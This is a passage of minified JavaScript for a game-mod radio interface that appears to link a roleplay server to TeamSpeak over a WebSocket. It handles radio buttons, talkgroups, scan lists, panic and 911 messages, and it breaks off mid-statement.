var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.createTemplateTagFirstArg = function(a) {
    return a.raw = a
};
$jscomp.createTemplateTagFirstArgWithRaw = function(a, c) {
    a.raw = c;
    return a
};
$jscomp.arrayIteratorImpl = function(a) {
    var c = 0;
    return function() {
        return c < a.length ? {
            done: !1,
            value: a[c++]
        } : {
            done: !0
        }
    }
};
$jscomp.arrayIterator = function(a) {
    return {
        next: $jscomp.arrayIteratorImpl(a)
    }
};
$jscomp.makeIterator = function(a) {
    var c = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
    return c ? c.call(a) : $jscomp.arrayIterator(a)
};

function log(a) {
    console.log("radio: " + a)
}
log("nui beginning startup");
Date.prototype.stdTimezoneOffset = function() {
    var a = new Date(this.getFullYear(), 0, 1),
        c = new Date(this.getFullYear(), 6, 1);
    return Math.max(a.getTimezoneOffset(), c.getTimezoneOffset())
};
Date.prototype.isDstObserved = function() {
    return this.getTimezoneOffset() < this.stdTimezoneOffset()
};

function addZero(a) {
    return 10 > a ? "0" + a : a
}
var tsUUID = "",
    debug = !1,
    debugLevel = 0,
    backlightTimeout, wasMoving = !1;

function playButtonPress(a) {
    $("audio").remove();
    clearTimeout(backlightTimeout);
    a = a ? new Audio("sounds/buttonpress.mp3") : new Audio("sounds/buttondeny.mp3");
    $(".portable-radio-display").addClass("backlight");
    backlightTimeout = setTimeout(function() {
        $(".portable-radio-display").removeClass("backlight")
    }, 5E3);
    a.volume = getAudioVolume();
    a.play()
}

function getAudioVolume() {
    return .001 * (radio.volume + 30)
}
var websocket, wsConnected = !1,
    disconnectNotified = !1,
    resourceName = "",
    version = "",
    displayTimeout = null,
    heartbeatInterval = null,
    longHaul = null,
    radio = {
        TeamspeakID: tsUUID,
        radioEnabled: !1,
        radioConnected: !0,
        isSending: !1,
        isTransmitting: !1,
        isReceiving: !0,
        dataTimeout: null,
        sentTimeout: null,
        receivedTimeout: null,
        panicked: !1,
        volume: 0,
        volumeTimeout: null,
        scanning: !1,
        scanningOn: !1,
        scannedTalkGroup: 1,
        talkGroup: 1,
        talkGroups: [],
        onTalkaround: !1,
        scannedTalkGroups: [],
        page: 0,
        pages: [
            ["ScnL", "Nuis", "Ch 1"]
        ],
        vList: {
            "long": !1,
            preText: "",
            parts: [],
            current: 0
        },
        led: {
            idle: !0
        },
        mobileDark: !1,
        rssi: 4,
        alwaysDisplayed: !1,
        visible: !1,
        scanLists: new Map
    },
    lastMessage = new Date,
    ipAd = "";


try {
    ipAd = devIpAddress(), "" !== ipAd.trim() && init()
} catch (a) {}

var reconnectAttempts = 0,
    reconnectThread = setInterval(function() {
        wsConnected || (log("Socket connection lost."), "" !== ipAd && 10 > reconnectAttempts && init())
    }, 1E4);

function init() {
    "" === ipAd ? log("invalid data") : 10 <= reconnectAttempts ? log("too many reconnection attempts. user must manually force a reconnection once TeamSpeak 3 Client is running.") : (reconnectAttempts++, $("#pluginStatus").text("Connecting. . . ."), log("attempting a new connection"), $(".green-led").toggle(!0), $(".red-led").toggle(!0), $(".yellow-led").toggle(!0), "undefined" !== typeof websocket && websocket.readyState === websocket.OPEN && (log("existing connection is valid, reconnecting"), websocket.close(1E3,
        "Reconnecting")), websocket = new WebSocket(ipAd), websocket.onopen = function() {
        reconnectAttempts = 0;
        log("connection opened!");
        $("#pluginStatus").text("Connected!");
        wsConnected = !0;
        disconnectNotified = !1;
        $("#connectionBox").fadeOut(1500);
        lastMessage = new Date;
        heartbeatInterval = setInterval(function() {
            radio.led.idle && radio.radioEnabled && ($("#portable-led").toggle(), $("#portable-led").is(":visible") && setTimeout(function() {
                $("#portable-led").toggle()
            }, 300));
            3E4 < Date.now() - lastMessage && sendWS(JSON.stringify({
                type: "heartbeat"
            }));
            6E4 < Date.now() - lastMessage && (log("ws: last message was " + (Date.now() - lastMessage) + "ms ago. Socket connection probably is interrupted."), sendNotification("~r~Websocket timed out. Reconnecting"), log("ws: reconnecting"), init())
        }, 5E3);
        longHaul = setInterval(function() {
            doDisplayStuff()
        }, 1E3);
        setTimeout(function() {
            $(".green-led").toggle(!1);
            $(".red-led").toggle(!1);
            $(".yellow-led").toggle(!1)
        }, 1E3)
    }, websocket.onmessage = function(a) {
        lastMessage = new Date;
        handleWS(JSON.parse(a.data))
    }, websocket.onclose = function(a) {
        wsConnected = !1;
        sendWS(JSON.stringify({
            type: "disconnect"
        }));
        clearInterval(heartbeatInterval);
        var c = 1E3 === a.code ? "Normal closure, meaning that the purpose for which the connection was established has been fulfilled." : 1001 === a.code ? "An endpoint is 'going away', such as a server going down or a browser having navigated away from a page." : 1002 === a.code ? "An endpoint is terminating the connection due to a protocol error" : 1003 === a.code ? "An endpoint is terminating the connection because it has received a type of data it cannot accept (e.g., an endpoint that understands only text data MAY send this if it receives a binary message)." :
            1004 === a.code ? "Reserved. The specific meaning might be defined in the future." : 1005 === a.code ? "No status code was actually present." : 1006 === a.code ? "The connection was closed abnormally, e.g., without sending or receiving a Close control frame" : 1007 === a.code ? "An endpoint is terminating the connection because it has received data within a message that was not consistent with the type of the message (e.g., non-UTF-8 [http://tools.ietf.org/html/rfc3629] data within a text message)." : 1008 === a.code ? "An endpoint is terminating the connection because it has received a message that 'violates its policy'. This reason is given either if there is no other suitable reason, or if there is a need to hide specific details about the policy." :
            1009 === a.code ? "An endpoint is terminating the connection because it has received a message that is too big for it to process." : 1010 === a.code ? "An endpoint (client) is terminating the connection because it has expected the server to negotiate one or more extension, but the server didn't return them in the response message of the WebSocket handshake. <br /> Specifically, the extensions that are needed are: " + a.reason : 1011 === a.code ? "A server is terminating the connection because it encountered an unexpected condition that prevented it from fulfilling the request." :
            1015 === a.code ? "The connection was closed due to a failure to perform a TLS handshake (e.g., the server certificate can't be verified)." : "Unknown reason";
        $(".no-link").show();
        $("#pluginStatus").text("Disconnected");
        $("#connectionBox").fadeIn();
        $(".radio-display").hide();
        radio.visible = !1;
        disconnectNotified || (log("Connection closed " + c + " (" + a.code + ")"), sendNotification("~r~Radio System is Not Connected!! SAEC Will reconnect soon!"), disconnectNotified = !0)
    })
}

function checkRadioState() {
    $(".no-link").hide();
    radio.radioEnabled ? (radio.scanning = !1, $(".lower-text").hide(), $(".vertical-list").hide(), $(".top-text").text("Zone 1"), $(".top-text").show(), $(".channel-text").text(radio.talkGroups[radio.talkGroup]), $(".channel-text").css("background-color", ""), updatePage(), $(".radio-display").fadeIn(), $(".scanning").toggle(radio.scanningOn), checkDarkDisplay()) : ($("#portable-led").hide(), $(".radio-display").fadeOut(), radio.visible = !1)
}

function updatePage() {
    $(".btm-text-1").text(radio.pages[radio.page][0]);
    $(".btm-text-2").text(radio.pages[radio.page][1]);
    $(".btm-text-3").text(radio.pages[radio.page][2]);
    $(".btmText").show()
}

function displayTimeoutReset() {
    null !== displayTimeout && clearTimeout(displayTimeout);
    displayTimeout = setTimeout(function() {
        $(".free-text").text(radio.talkGroups[radio.talkGroup])
    }, 3E3)
}

function transmit(a) {
    radio.radioEnabled && (radio.isTransmitting = a, radio.led.idle = !a, a ? ($("#portable-led").css("background-color", "red"), sendDataIcon(!0)) : ($("#portable-led").css("background-color", "orange"), radio.isSending = !1), $(".red-led").toggle(a))
}

function receive(a) {
    radio.radioEnabled && (radio.led.idle = !a, a ? receiveDataIcon(!0) : radio.isReceiving = !1, $(".yellow-led").toggle(a))
}

function sendDataIcon(a) {
    a = void 0 === a ? !1 : a;
    radio.radioEnabled && (clearTimeout(radio.dataTimeout), clearTimeout(radio.sentTimeout), radio.radioConnected ? ($(".rssi-group").hide(), radio.isSending = !0, a || radio.isTransmitting || (radio.sentTimeout = setTimeout(function() {
        radio.isSending = !1
    }, 500)), $(".data-icons").toggle(!1), radio.isReceiving && $(".receive-data").toggle(!1), $(".send-data, .tower").toggle(!0)) : ($(".data.icons").toggle(!1), radio.isSending = !1, radio.isReceiving = !1))
}

function receiveDataIcon(a) {
    a = void 0 === a ? !1 : a;
    clearTimeout(radio.dataTimeout);
    clearTimeout(radio.receivedTimeout);
    radio.radioConnected ? ($(".rssi-group").hide(), radio.isReceiving = !0, a || (radio.receivedTimeout = setTimeout(function() {
        radio.isReceiving = !1
    }, 500)), $(".data-icons").toggle(!1), radio.isSending ? $(".send-data").toggle(!0) : $(".receive-data, .tower").toggle(!0)) : ($(".data.icons").toggle(!1), radio.isSending = !1, radio.isReceiving = !1)
}

function doDisplayStuff() {}

function sendNotification(a) {
    sendNUI("show_notification", JSON.stringify({
        notification: a
    }))
}

function sendAudioNotification(a, c) {
    sendNUI("audio_notification", JSON.stringify({
        sound: a,
        set: c
    }))
}

function handlePage(a) {
    $("#portable-front-lower-text").css("background-color", a.color);
    $(".lower-text").text(a.text);
    $(".main-text").css("background-color", a.color);
    $(".lower-text").toggle(!0);
    setTimeout(function() {
        $(".lower-text").toggle(!1);
        checkDarkDisplay()
    }, 12E3)
}

function checkDarkDisplay() {
    $(".main-text").css("background-color", "");
    radio.mobileDark ? ($(".mobile-radio-display").css({
        backgroundColor: "black",
        color: "white"
    }), $(".invertable").css("filter", "invert(1)")) : ($(".mobile-radio-display").css({
        backgroundColor: "",
        color: "black"
    }), $(".invertable").css("filter", ""))
}

function drawRssi() {
    $(".rssi-bar").hide();
    radio.radioConnected && ($(".portable-rssi-bar").slice(0, radio.rssi).show(), $(".mobile-rssi-bar").slice(0, radio.rssi).show(), $(".persistent-rssi-bar").slice(0, radio.rssi).show())
}

function drawScanLists() {
    $("#scan-list-talkgroups").html("");
    for (var a = 1; a < radio.talkGroups.length; a++) $("#scan-list-talkgroups").append('<option value="' + (a + 1) + '">' + radio.talkGroups[a] + "</option>");
    $("#scan-lists-table").html("");
    a = $(document.createElement("table"));
    var c = $(document.createElement("thead")),
        f = $(document.createElement("td"));
    f.html("Scan List Name");
    c.append(f);
    f = $(document.createElement("td"));
    f.html("Scanned Talkgroups");
    c.append(f);
    a.append(c);
    c = {};
    f = $jscomp.makeIterator(radio.scanLists.keys());
    for (var k = f.next(); !k.done; c = {
            $jscomp$loop$prop$str$10: c.$jscomp$loop$prop$str$10,
            $jscomp$loop$prop$list$11: c.$jscomp$loop$prop$list$11
        }, k = f.next()) {
        k = k.value;
        c.$jscomp$loop$prop$list$11 = radio.scanLists.get(k);
        var d = $(document.createElement("tr")),
            b = $(document.createElement("td"));
        b.html(k);
        d.append(b);
        b = $(document.createElement("td"));
        c.$jscomp$loop$prop$str$10 = "";
        c.$jscomp$loop$prop$list$11.forEach(function(e) {
            return function(g) {
                g <= radio.talkGroups.length + 1 ? e.$jscomp$loop$prop$str$10 += radio.talkGroups[g -
                    1] + ", " : e.$jscomp$loop$prop$list$11.splice(e.$jscomp$loop$prop$list$11.indexOf(g, 1))
            }
        }(c));
        c.$jscomp$loop$prop$str$10 = c.$jscomp$loop$prop$str$10.replace(/,\s$/, "");
        b.html(c.$jscomp$loop$prop$str$10);
        d.append(b);
        b = $(document.createElement("td"));
        b.addClass("scan-list-load");
        b.html("Load");
        b.attr("data-name", k);
        d.append(b);
        b = $(document.createElement("td"));
        b.addClass("scan-list-edit");
        b.html("Edit");
        b.attr("data-name", k);
        d.append(b);
        b = $(document.createElement("td"));
        b.addClass("scan-list-delete");
        b.html("Delete");
        b.attr("data-name", k);
        d.append(b);
        a.append(d)
    }
    $("#scan-lists-table").html(a)
}

function printDebug() {
    console.log(JSON.stringify(radio));
    console.log(radio)
}
$(function() {
    dragElement($("#portable-radio"));
    dragElement($("#mobile-radio"));
    setInterval(function() {
        if (radio.radioEnabled) radio.isReceiving || ($(".receive-data").is(":visible") && $(".receive-data").toggle(!1), $(".yellow-led").is(":visible") && $(".yellow-led").toggle(!1)), radio.isSending || radio.isTransmitting || ($(".send-data").is(":visible") && $(".send-data").toggle(!1), $(".red-led").is(":visible") && $(".red-led").toggle(!1)), !radio.isReceiving || $(".receive-data").is(":visible") || radio.isSending || radio.isTransmitting ||
            $(".receive-data").toggle(!0), radio.isSending && !$(".send-data").is(":visible") && $(".send-data").toggle(!0), radio.isTransmitting && !$(".red-led").is(":visible") && $(".red-led").toggle(!0), radio.isSending || radio.isTransmitting || radio.isReceiving || radio.onTalkaround || $(".rssi-group").is(":visible") || $(".rssi-group").show();
        else if ($(".receive-data").is(":visible") || $(".send-data").is(":visible") || $(".yellow-led").is(":visible") || $(".red-data").is(":visible")) $(".receive-data").toggle(!1), $(".yellow-led").toggle(!1),
            $(".send-data").toggle(!1), $(".red-led").toggle(!1)
    }, 250);
    var a = [],
        c = 0;
    setInterval(function() {
        1 < a.length ? (c >= a.length && (c = 0), $(".vertical-list-selected-item").text((0 < c ? "..." : "") + a[c] + (0 === c ? "..." : "")), ++c) : c = 0;
        var b = new Date;
        $(".zulu-time").text(addZero(b.getUTCHours()) + ":" + addZero(b.getUTCMinutes()) + "z")
    }, 1E3);
    $(document).click(function(b) {
        1 > $(b.target).closest("#radio").length && radio.visible && (wasMoving ? (log("intercepting close due to moving ui"), wasMoving = !1) : (debug && log("clicked outside of ui"),
            sendNUI("hide", ""), $("#tooltip").hide(), $("#portable-radio").fadeOut(), $("#mobile-radio").fadeOut(), radio.visible = !1))
    });
    var f = !0;
    $("body").on("mousemove", function(b) {
        f && (f = !1, $("#tooltip").is(":visible") && $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        }), setTimeout(function() {
            return f = !0
        }, 50))
    });
    $("body").keypress(function(b) {
        if (96 === b.charCode || 119 === b.charCode || 97 === b.charCode || 100 === b.charCode || 115 === b.charCode)
            if ($("#portable-radio").is(":visible") || $("#mobile-radio").is(":visible")) debug &&
                log("pressed key to close ui"), sendNUI("hide", ""), $("#tooltip").hide(), $("#portable-radio").fadeOut(), $("#mobile-radio").fadeOut(), radio.visible = !1
    });
    $(".panic-btn").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("PANIC");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    $(".panic-btn").click(function() {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed panic-btn"), playButtonPress(!0), sendNUI("panic", ""))
    });
    $(".power-btn").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("POWER");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    $(".power-btn").click(function() {
        radio.panicked || wasMoving || (debug && log("pressed power-btn"), radio.scanning = !1, sendWS(JSON.stringify({
            type: "radio_enabled",
            value: !radio.radioEnabled
        })))
    });
    $(".volume-up").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("VOLUME UP (HOLD FASTER)");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    var k = !1;
    $(".volume-up").on("mousedown", function() {
        radio.volumeTimeout = setInterval(function() {
            k = !0;
            radio.volume += 5;
            $(".free-text").text("Volume: " + radio.volume);
            20 < radio.volume && (clearInterval(radio.volumeTimeout), radio.volume = 20);
            !radio.radioEnabled && -30 < radio.volume && sendWS(JSON.stringify({
                type: "radio_enabled",
                value: !0
            }))
        }, 250)
    }).on("mouseup", function() {
        clearInterval(radio.volumeTimeout);
        k || (radio.volume += 1);
        20 < radio.volume &&
            (radio.volume = 20);
        sendWS(JSON.stringify({
            type: "radio_volume",
            volume_modifier: radio.volume
        }));
        k = !1
    });
    $(".volume-down").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("VOLUME DOWN (HOLD FASTER)");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    var d = !1;
    $(".volume-down").on("mousedown", function() {
        radio.volumeTimeout = setInterval(function() {
            d = !0;
            radio.volume -= 5;
            $(".free-text").text("Volume: " + radio.volume); - 30 > radio.volume && (clearInterval(radio.volumeTimeout),
                radio.volume = -31);
            radio.radioEnabled && -29 > radio.volume && sendWS(JSON.stringify({
                type: "radio_enabled",
                value: !1
            }))
        }, 250)
    }).on("mouseup", function() {
        clearInterval(radio.volumeTimeout);
        d || --radio.volume; - 30 > radio.volume && (radio.volume = -31);
        sendWS(JSON.stringify({
            type: "radio_volume",
            volume_modifier: radio.volume
        }));
        d = !1
    });
    $(".channel-down").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("CHANNEL DOWN");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    $(".channel-down").click(function() {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed channel-down"), 2 > radio.talkGroup ? radio.talkGroup = radio.talkGroups.length - 1 : radio.talkGroup--, playButtonPress(!0), sendWS(JSON.stringify({
            type: "set_talkgroup",
            talkgroup: radio.talkGroup
        })))
    });
    $(".channel-up").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("CHANNEL UP");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    $(".channel-up").click(function() {
        !radio.radioEnabled ||
            radio.panicked || wasMoving || (debug && log("pressed channel-up"), radio.talkGroups.length - 1 === radio.talkGroup ? radio.talkGroup = 1 : radio.talkGroup++, playButtonPress(!0), sendWS(JSON.stringify({
                type: "set_talkgroup",
                talkgroup: radio.talkGroup
            })))
    });
    $(".backlight-btn").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("BACKLIGHT (HOLD DARK/LIGHT)");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    $(".backlight-btn").click(function() {
        radio.radioEnabled &&
            !wasMoving && (debug && log("pressed backlight-btn"), playButtonPress(!0), radio.mobileDark = !radio.mobileDark, checkDarkDisplay())
    });
    $(".soft-btn-1").click(function() {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed soft-btn-1"), radio.scanning ? sendWS(JSON.stringify({
            type: "add_scan_talkgroup",
            talkgroup: parseInt($("#portable-front-vertical-list").attr("data-pos"), 10)
        })) : 0 === radio.page ? (radio.scanning = !radio.scanning, playButtonPress(!0), $(".top-text").text(""), $(".free-text").text(radio.talkGroups[radio.scannedTalkGroup]),
            $(".vertical-list").toggle(radio.scanning), radio.scanning ? ($(".btm-text-1").text("Set"), $(".btm-text-2").text("Rem"), $(".btm-text-3").text("Exit")) : checkRadioState(), $(".scanning").toggle(-1 !== radio.scannedTalkGroups.indexOf(parseInt($("#portable-front-vertical-list").attr("data-pos"), 10)))) : 1 === radio.page && playButtonPress(!1))
    });
    $(".soft-btn-2").click(function() {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed soft-btn-2"), radio.scanning ? sendWS(JSON.stringify({
            type: "remove_scan_talkgroup",
            talkgroup: parseInt($("#portable-front-vertical-list").attr("data-pos"), 10)
        })) : 0 === radio.page ? 0 === radio.scannedTalkGroups.length ? playButtonPress(!1) : (playButtonPress(!0), sendWS(JSON.stringify({
            type: "nuisance_delete"
        }))) : 1 === radio.page && playButtonPress(!1))
    });
    $(".soft-btn-3").click(function() {
        radio.radioEnabled && !wasMoving && (debug && log("pressed soft-btn-3"), radio.scanning ? (playButtonPress(!0), radio.scanning = !1, $(".vertical-list").hide(), checkRadioState()) : (sendWS(JSON.stringify({
            type: "set_talkgroup",
            talkgroup: 1
        })), playButtonPress(1 !== radio.talkGroup)))
    });
    $(".soft-btn-4").click(function() {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed soft-btn-4"), playButtonPress(!1))
    });
    $(".soft-btn-5").click(function() {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed soft-btn-5"), playButtonPress(!1))
    });
    $(".home-btn").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("HOME");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    $(".home-btn").click(function() {
        radio.radioEnabled && !wasMoving && (debug && log("pressed home-btn"), radio.page = 0, checkRadioState(), playButtonPress(!0))
    });
    $(".soft-btn-up").click(function() {
        if (radio.radioEnabled && !radio.panicked && !wasMoving && (debug && log("pressed soft-btn-up"), radio.scanning)) {
            playButtonPress(!0);
            $(".vertical-list").children().removeClass("vertical-list-selected-item");
            var b = $("#portable-front-vertical-list").attr("data-pos");
            b = parseInt(b, 10) - 1;
            var e = $("#portable-front-vertical-list").attr("data-cursor"),
                g = parseInt(e, 10) - 1;
            if (1 > g)
                if (1 > b)
                    for (b = radio.talkGroups.length, $(".vertical-list").children().remove(), e = radio.talkGroups.length - 3; e < radio.talkGroups.length; e++) b = $("<div class='vertical-list-item " + (e === radio.talkGroups.length - 1 ? "vertical-list-selected-item" : "") + "' id='scanlist-" + e + "' data-id='" + e + "'>" + radio.talkGroups[e] + "</div>"), $(".vertical-list").append(b), g = 3, b = radio.talkGroups.length - 1;
                else $("div[data-id='" + (b + 3) + "']").remove(), e = $("<div class='vertical-list-item vertical-list-selected-item' id='scanlist-" +
                    b + "' data-id='" + b + "'>" + radio.talkGroups[b].substr(0, 14) + "</div>"), $(".vertical-list").prepend(e), g = 1;
            radio.scannedTalkGroup = b;
            $(".free-text").text(radio.talkGroups[radio.scannedTalkGroup]);
            $("div[data-id='" + b + "']").addClass("vertical-list-selected-item");
            a = radio.talkGroups[b].match(/.{1,14}/g) || [];
            c = 0;
            $("#portable-front-vertical-list").attr("data-cursor", g);
            $("#portable-front-vertical-list").attr("data-pos", b);
            $(".scanning").toggle(radio.scannedTalkGroups.includes(b))
        }
    });
    $(".soft-btn-down").click(function() {
        if (radio.radioEnabled &&
            !radio.panicked && (debug && log("pressed soft-btn-down"), radio.scanning)) {
            playButtonPress(!0);
            $(".vertical-list").children().removeClass("vertical-list-selected-item");
            var b = $("#portable-front-vertical-list").attr("data-pos"),
                e = $("#portable-front-vertical-list").attr("data-cursor");
            e = parseInt(e, 10) + 1;
            b = parseInt(b, 10) + 1;
            if (b >= radio.talkGroups.length) {
                b = 1;
                $(".vertical-list").children().remove();
                for (var g = 1; 4 > g; g++) e = $("<div class='vertical-list-item " + (1 === g ? "vertical-list-selected-item" : "") + "' id='scanlist-" +
                    g + "' data-id='" + g + "'>" + radio.talkGroups[g] + "</div>"), $(".vertical-list").append(e), e = 1
            } else 3 < e && ($("div[data-id='" + (b - 3) + "']").remove(), e = $("<div class='vertical-list-item' id='scanlist-" + b + "' data-id='" + b + "'>" + radio.talkGroups[b].substr(0, 14) + "</div>"), $(".vertical-list").append(e), e = 3);
            radio.scannedTalkGroup = b;
            $(".free-text").text(radio.talkGroups[radio.scannedTalkGroup]);
            $("div[data-id='" + b + "']").addClass("vertical-list-selected-item");
            a = radio.talkGroups[b].match(/.{1,14}/g) || [];
            c = 0;
            $("#portable-front-vertical-list").attr("data-pos",
                b);
            $("#portable-front-vertical-list").attr("data-cursor", e);
            $(".scanning").toggle(radio.scannedTalkGroups.includes(b))
        }
    });
    $(".soft-btn-left").click(function(b) {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed soft-btn-left"), radio.scanning ? playButtonPress(!1) : (b = radio.page, --radio.page, 0 > radio.page && (radio.page = radio.pages.length - 1), updatePage(), playButtonPress(b !== radio.page)))
    });
    $(".soft-btn-right").click(function(b) {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed soft-btn-right"),
            radio.scanning ? playButtonPress(!1) : (b = radio.page, radio.page += 1, radio.page >= radio.pages.length && (radio.page = 0), updatePage(), playButtonPress(b !== radio.page)))
    });
    $("#portable-other-btn").click(function() {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed portable-other-btn"), playButtonPress(!1))
    });
    $("#portable-extra-btn-1").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("SCAN");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    $("#portable-extra-btn-1").click(function() {
        radio.radioEnabled && !wasMoving && (debug && log("pressed portable-extra-btn-1"), sendWS(JSON.stringify({
            type: "scan_state",
            state: !radio.scanningOn
        })), playButtonPress(!0))
    });
    $("#portable-extra-btn-2").click(function() {
        radio.radioEnabled && !wasMoving && (debug && log("pressed portable-extra-btn-2"), radio.scanning = !1, sendWS(JSON.stringify({
            type: "radio_enabled",
            value: !radio.radioEnabled
        })))
    });
    $("#portable-no-btns").click(function() {
        !radio.radioEnabled || radio.panicked ||
            wasMoving || (debug && log("pressed disabled button on portable"), playButtonPress(!1))
    });
    $("#mobile-p-btn").on("mouseover", function(b) {
        $("#tooltip").css({
            left: b.clientX + 5,
            top: b.clientY
        });
        $("#tooltip").text("SCAN");
        $("#tooltip").show()
    }).on("mouseout", function() {
        $("#tooltip").hide()
    });
    $("#mobile-p-btn").click(function() {
        !radio.radioEnabled || radio.panicked || wasMoving || (debug && log("pressed mobile-p-btn"), sendWS(JSON.stringify({
            type: "scan_state",
            state: !radio.scanningOn
        })), playButtonPress(!0))
    });
    $("#scan-list-new").click(function() {
        $("#scan-list-talkgroups").val("");
        $("#scan-list-name").val("");
        $("#scan-list-modal").fadeIn();
        $("#scan-lists-dialog").hide()
    });
    $("#scan-list-save").click(function() {
        "" !== $("#scan-list-name") && (radio.scanLists.set($("#scan-list-name").val(), $("#scan-list-talkgroups").val()), $("#scan-list-name").val(""), $("#scan-list-talkgroups").val(""), $("#scan-list-modal").hide(), $("#scan-lists-dialog").fadeIn(), drawScanLists())
    });
    $("#scan-list-cancel").click(function() {
        $("#scan-list-name").val("");
        $("#scan-list-talkgroups").val("");
        $("#scan-list-modal").hide();
        $("#scan-lists-dialog").fadeIn()
    });
    $(document).on("click", ".scan-list-delete", function(b) {
        radio.scanLists["delete"](b.target.dataset.name);
        drawScanLists()
    });
    $(document).on("click", ".scan-list-edit", function(b) {
        b = b.target.dataset.name;
        $("#scan-list-talkgroups").val(radio.scanLists.get(b));
        $("#scan-list-name").val(b);
        $("#scan-list-modal").fadeIn();
        $("#scan-lists-dialog").hide()
    });
    $(document).on("click", ".scan-list-load", function(b) {
        var e = b.target.dataset.name;
        radio.scannedTalkGroups.forEach(function(g) {
            sendWS(JSON.stringify({
                type: "remove_scan_talkgroup",
                talkgroup: g
            }))
        });
        setTimeout(function() {
            radio.scanLists.get(e).forEach(function(g) {
                sendWS(JSON.stringify({
                    type: "add_scan_talkgroup",
                    talkgroup: parseInt(g)
                }))
            })
        }, 1E3)
    });
    $("#scan-lists-save").click(function() {
        $("#scan-lists-dialog").fadeOut();
        sendNUI("set_scan_lists", JSON.stringify({
            lists: JSON.stringify(Array.from(radio.scanLists))
        }));
        sendNUI("hide", "")
    });
    $("#scan-lists-cancel").click(function() {
        $("#scan-lists-dialog").fadeOut();
        sendNUI("hide", "")
    });
    window.onbeforeunload = function() {
        "undefined" !== typeof websocket &&
            (websocket.onclose = function() {}, websocket.close())
    };
    window.addEventListener("message", function(b) {
        handleNUI(b.data)
    })
});

function sendNUI(a, c) {
    "" === resourceName.trim() ? console.warn("'resourcename' is not set properly. Falling back to limited functionality.") : (debug && log("sending nui: '" + a + ": " + c + "'"), $.post("https://" + resourceName + "/" + a, c, function(f) {
        receiveDataIcon();
        "ok" !== f && log("NUI ERROR: " + f)
    }))
}

function handleNUI(a) {
    if ("socket_data" === a.type) log("received valid server checks. proceeding...."), ipAd = a.info, init();
    else if (debug && log("received nui: " + JSON.stringify(a)), "resource_name" === a.type) log("nui linked. continuing setup"), resourceName = a.name, version = a.version, $("#pluginVersion").text(version), sendNUI("acknowledge", ""), sendNUI("get_ui_position", JSON.stringify({
        which: "portable-radio"
    })), sendNUI("get_ui_position", JSON.stringify({
        which: "mobile-radio"
    }));
    else if ("show_radio" === a.type) !0 ===
        a.foot ? $("#portable-radio").fadeIn() : $("#mobile-radio").fadeIn(), $("#persistent-radio").hide(), radio.visible = !0;
    else if ("hide_everything" === a.type) $("#connectionBox").empty(), $("#mobile-radio").hide(), $("#portable-radio").hide(), $("#persistent-radio").hide(), radio.visible = !1;
    else if ("hide_radio" === a.type) $("#mobile-radio").fadeOut(), $("#portable-radio").fadeOut(), radio.visible = !1;
    else if ("911" === a.type) sendWS(JSON.stringify({
        type: "911",
        street: a.street,
        postal: a.postal,
        realPostal: a.postal,
        coordsX: a.coordX,
        coordsY: a.coordY
    }));
    else if ("priority_911" === a.type) sendWS(JSON.stringify({
        type: "priority_911",
        street: a.street,
        postal: a.postal,
        realPostal: a.postal,
        coordsX: a.coordsX,
        coordsY: a.coordsY
    }));
    else if ("311" === a.type) sendWS(JSON.stringify({
        type: "311"
    }));
    else if ("panic" === a.type) radio.radioConnected && sendWS(JSON.stringify({
        type: "emergency_button",
        street: a.street,
        postal: a.postal,
        coordsX: a.coordsX,
        coordsY: a.coordsY
    }));
    else if ("location_update" === a.type) sendWS(JSON.stringify({
        type: "player_coordinates",
        x: Math.round(a.x),
        y: Math.round(a.y),
        z: Math.round(a.z)
    })), $(".gps").toggle(!0), setTimeout(function() {
        $(".gps").toggle(!1)
    }, 1E3);
    else if ("connection_status" === a.type) radio.radioConnected = a.status, radio.rssi = a.strength || 0, a.status ? (radio.radioEnabled && sendNotification("~g~Radio signal acquired"), $(".lower-text").hide(), checkDarkDisplay()) : ($(".main-text").css("background-color", "red"), $("#portable-front-lower-text").css("background-color", "red"), $(".lower-text").text("Out of range"), $(".lower-text").show(), radio.radioEnabled &&
        sendNotification("~r~Radio signal lost")), drawRssi(), sendWS(JSON.stringify({
